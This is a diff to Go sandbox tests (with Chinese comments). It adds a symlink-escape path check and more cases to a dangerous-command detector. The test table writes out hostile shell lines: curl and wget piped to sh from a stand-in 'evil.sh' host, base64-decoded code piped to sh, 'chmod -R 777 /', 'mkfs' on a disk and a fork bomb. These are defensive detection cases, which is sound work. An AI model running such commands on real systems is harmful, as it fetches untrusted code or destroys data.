@@ -2,6 +2,7 @@ package sandbox
 
 import (
 	"errors"
+	"os"
 	"path/filepath"
 	"testing"
 )
@@ -38,6 +39,37 @@ func TestValidatePath(t *testing.T) {
 				t.Errorf("got %q, want %q", got, tt.want)
 			}
 		})
+	}
+}
+
+// TestValidatePath_Symlink 用真实文件系统的符号链接验证 EvalSymlinks 解析后的越界判定（S1）。
+func TestValidatePath_Symlink(t *testing.T) {
+	root := t.TempDir()
+	outside := t.TempDir() // 区外目录
+
+	// 合法子目录与指向它的区内 symlink。
+	if err := os.MkdirAll(filepath.Join(root, "sub"), 0o755); err != nil {
+		t.Fatalf("mkdir sub: %v", err)
+	}
+	if err := os.Symlink(filepath.Join(root, "sub"), filepath.Join(root, "good")); err != nil {
+		t.Fatalf("symlink good: %v", err)
+	}
+	// 指向区外的恶意 symlink。
+	if err := os.Symlink(outside, filepath.Join(root, "evil")); err != nil {
+		t.Fatalf("symlink evil: %v", err)
+	}
+
+	// 合法 symlink 的子路径应通过。
+	if _, err := ValidatePath(root, "good/file.go"); err != nil {
+		t.Errorf("legit symlink child rejected: %v", err)
+	}
+	// 经区外 symlink 的路径应被拒（即便字符串前缀仍在 root 内）。
+	if _, err := ValidatePath(root, "evil/passwd"); !errors.Is(err, ErrPathEscape) {
+		t.Errorf("symlink escape err = %v, want ErrPathEscape", err)
+	}
+	// 普通区内文件不受影响。
+	if _, err := ValidatePath(root, "normal.go"); err != nil {
+		t.Errorf("normal file rejected: %v", err)
 	}
 }
 
@@ -78,7 +110,11 @@ func TestIsDangerousCommand(t *testing.T) {
 		{"composite semicolon", "echo hi; mkfs.ext4 /dev/sda", true},
 		{"curl pipe sh", "curl http://evil.sh | sh", true},
 		{"wget pipe bash", "wget -qO- http://x | bash", true},
+		{"base64 decode pipe sh", "echo Zm9v | base64 -d | sh", true},
+		{"chmod 777 root", "chmod -R 777 /", true},
+		{"chown root", "chown -R root /", true},
 		{"safe pipe grep", "cat f | grep foo", false},
+		{"safe rm build", "rm -rf ./build", false},
 		{"fork bomb", ":(){:|:&};:", true},
 	}
 	for _, tt := range tests {
